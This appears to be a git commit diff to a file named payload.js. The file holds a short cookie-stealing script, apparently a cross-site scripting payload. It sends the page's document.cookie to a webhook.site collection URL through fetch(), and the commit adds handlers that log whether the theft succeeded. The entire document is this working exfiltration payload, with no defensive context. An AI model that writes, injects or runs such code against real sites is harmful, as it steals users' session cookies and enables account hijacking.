163f9eafb6a6244ca386a67988bfa92721a96814
André Matos <101091954+andrem000@users.noreply.github.com>
2024-12-02 21:33:14 +0000

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,4 @@
 fetch('https://webhook.site/ed806f93-bd67-4e29-8047-6765093216e3?cookie=' + document.cookie)
+  .then(response => response.text())
+  .then(data => console.log('Cookie sent:', data))
+  .catch(error => console.error('Error sending cookie:', error));
